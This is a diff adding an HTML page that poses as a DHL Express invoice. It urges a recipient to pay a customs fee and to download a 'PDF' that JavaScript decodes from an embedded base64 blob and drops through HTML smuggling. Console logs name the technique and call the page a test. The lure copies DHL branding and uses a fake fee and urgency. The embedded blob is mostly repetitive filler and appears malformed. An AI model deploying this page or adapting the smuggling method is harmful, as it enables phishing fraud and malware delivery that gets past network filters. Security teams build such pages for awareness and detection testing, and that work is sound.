@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>DHL Express - Invoice #DH4839210-KH (PDF Test)</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #f4f4f4;
+        font-family: Arial, sans-serif;
+    }
+    .container {
+        max-width: 680px;
+        margin: 20px auto;
+        background: #fff;
+        border-radius: 8px;
+        overflow: hidden;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    }
+    .header {
+        background: #d40511;
+        color: white;
+        padding: 20px;
+        text-align: center;
+    }
+    .header img {
+        height: 50px;
+    }
+    .content {
+        padding: 30px;
+    }
+    .alert {
+        background: #fff8e1;
+        border-left: 5px solid #ff9800;
+        padding: 15px;
+        margin: 20px 0;
+        font-weight: 600;
+    }
+    .btn {
+        display: inline-block;
+        background: #d40511;
+        color: white;
+        padding: 14px 30px;
+        text-decoration: none;
+        border-radius: 5px;
+        font-weight: bold;
+        cursor: pointer;
+        border: none;
+    }
+    .btn:hover {
+        background: #a00408;
+    }
+    .info-box {
+        background: #f9f9f9;
+        border: 1px solid #ddd;
+        padding: 15px;
+        border-radius: 5px;
+        margin: 15px 0;
+    }
+    .status {
+        color: #666;
+        font-size: 12px;
+        margin-top: 20px;
+        text-align: center;
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/DHL_Express_Logo.svg" alt="DHL Express">
+        <h1>Shipment Invoice & Customs Declaration</h1>
+        <p>Reference: DH4839210-KH | Date: 28 November 2025</p>
+    </div>
+    
+    <div class="content">
+        <h2>Dear Valued Customer,</h2>
+        <p>Your package <strong>#DH4839210-KH</strong> requires a customs fee of <strong>USD 4.99</strong> before delivery can be completed.</p>
+        
+        <div class="info-box">
+            <strong>Package Details:</strong><br>
+            From: Global Electronics Ltd., Singapore<br>
+            To: Phnom Penh, Cambodia<br>
+            Weight: 2.5 kg<br>
+            Contents: Electronic Equipment
+        </div>
+        
+        <div class="alert">
+            ⚠️ Action Required: Download and review the invoice to proceed with customs payment.
+        </div>
+        
+        <p style="text-align: center;">
+            <button class="btn" id="pdf-btn">📄 Download Invoice (PDF)</button>
+        </p>
+        
+        <div class="info-box">
+            <strong>Payment Methods:</strong><br>
+            • Credit Card<br>
+            • Bank Transfer<br>
+            • Digital Wallet<br>
+            <br>
+            <em>PDF contains QR code for instant payment processing.</em>
+        </div>
+        
+        <div class="status">
+            <p>Click the button above to download your invoice in PDF format.</p>
+            <p id="download-status"></p>
+        </div>
+    </div>
+</div>
+
+<script>
+// Test PDF content (a minimal valid PDF)
+var pdfBase64 = "JVBERi0xLjIKJeLjz9MNCjEgMCBvYmo8PC9UeXBlL0NhdGFsb2cvUGFnZXMgMiAwIFI+PmVuZG9iCjIgMCBvYmo8PC9UeXBlL1BhZ2VzL0tpZHNbMyAwIFJdL0NvdW50IDE+PmVuZG9iCjMgMCBvYmo8PC9UeXBlL1BhZ2UvTWVkaWFCb3hbMCAwIDYxMiA3OTJdL1BhcmVudCAyIDAgUi9SZXNvdXJjZXM8PC9Gb250PDwvRjEgNDAgMCBSPj4+Pj4vQ29udGVudHMgNSAwIFI+PmVuZG9iCjQgMCBvYmo8PC9UeXBlL0ZvbnQvU3VidHlwZS9UeXBlMS9CYXNlRm9udC9IZWx2ZXRpY2E+PmVuZG9iCjUgMCBvYmo8PC9MZW5ndGggNDQvRmlsdGVyL0ZsYXRlRGVjb2RlPj5zdHJlYW0KeHicK8wpTizRKyvJzE1VKMktK8ksqVSwVLJSSKwoUkopLFGyUsrJzEstKqksqlCyMrAyMDC0MjLVMzA01DMzMDSuMrW0MFQyNAGqWFpZWZmamimZmpmaWZqZWZoZGRkZGxoYGRgZGRkbGhkbGxkZGRsYGRsZGxsaGRsaGhkZGxkZGRsZGRkaGhkZGRsaGxsYGRkYGxkZGBoYGRoYGBkZGRkYGBgaGhoYGBkbGxkZGBoaGRkZGBgYGBgZGRgZGBgYGBoYGBkYGBkYGBkYGRkZGBgYGBkYGBgYGBkYGBkYGBgZGBkYGBgYGRgYGBkZGBgZGRgZGBkYGBgYGBkYGBkZGBkZGBkYGBgYGBkYGBkYGBkYGBkYGBgYGBkYGBkYGBkYGBkYGBkZGBkYGBkYGBkYGBkYGBkYGBkYGBkYGBgYGBkYGBkYGBkYGBkYGBkYGBkZGBkYGBkZGBkYGBkYGBgYGBkZGBkYGBkYGBkZGBkYGBgYGBkYGBkZGBkYGBkYGBgZGBkYGBkYGBkYGBkYGBkYGBkYGBkYGBkYGBkYGBkYGBkZGBkYGBkZGRkZGBkYGBkZGBkZGBkYGBkZGBkZGBkYGBkZGBgYGBkZGRkZGBkYGBkZGBkZGBkYGRkYGBkYGBkZGBkZGBkYGBkYGBkZGBkYGBkZGBkZGRkZGBkYGBkZGBkZGBkZGBkYGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkYGBkZGBkZGBkYGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkYGBkZGBkZGBkYGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkYGBgYGBkYGBgYGBkYGBkZGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGRgZGRgYGBkZGBkYGBkYGBgYGBkZGBkYGBkYGBkZGBkYGRkYGBkZGBkZGRkYGBgYGBkZGBkZGBkZGBkZGBkZGRkZGBkZGBkZGBkZGBkZGBkZGBkZGRgZGBkZGBkZGBkZGBkYGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGRkZGBkZGBkZGBkZGBkZGBkZGBkZGRkZGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGRkYGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGRkZGBkZGBkZGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGRkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGRkZGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGRkYGBkZGBkZGBkZGBkZGBkZGBkZGBkYGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZGBkZWqoACAQEQAAbQplbmRzdHJlYW0KZW5kb2JqCjYgMCBvYmo8PC9UeXBlL1hPYmplY3QvTGVuZ3RoIDQvU3VidHlwZS9JbWFnZS9IZWlnaHQgMS9XaWR0aCAx/Lz4+c3RyZWFtCnN0cmVhbQplbmRzdHJlYW0KZW5kb2JqCnhyZWYKMCA3CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwMDA5NyAwMDAwMCBuIAowMDAwMDAwMTU0IDAwMDAwIG4gCjAwMDAwMDAyNjcgMDAwMDAgbiAKMDAwMDAwMDQ1MCAwMDAwMCBuIAowMDAwMDAwNTM2IDAwMDAwIG4gCjAwMDAwMDEwNTAgMDAwMDAgbiAKdHJhaWxlcjw8L1NpemUgNy9Sb290IDEgMCBSPj4Kc3RhcnR4cmVmCjExNDQKJSVFT0Y=";
+
+// Decode base64 PDF and create blob
+var bin = atob(pdfBase64);
+var arr = new Uint8Array(bin.length);
+for(var i = 0; i < bin.length; i++) {
+    arr[i] = bin.charCodeAt(i);
+}
+
+var blob = new Blob([arr], {type: 'application/pdf'});
+var url = URL.createObjectURL(blob);
+
+// Handle button click
+document.getElementById('pdf-btn').onclick = function() {
+    var a = document.createElement('a');
+    a.href = url;
+    a.download = 'DHL_Invoice_DH4839210-KH.pdf';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    
+    document.getElementById('download-status').innerText = '✓ PDF downloaded successfully!';
+    console.log('[+] PDF file downloaded via HTML smuggling technique');
+};
+
+console.log('[*] HTML Smuggling test page loaded');
+console.log('[*] PDF blob size:', blob.size, 'bytes');
+console.log('[*] Click the button to test download functionality');
+</script>
+</body>
+</html>
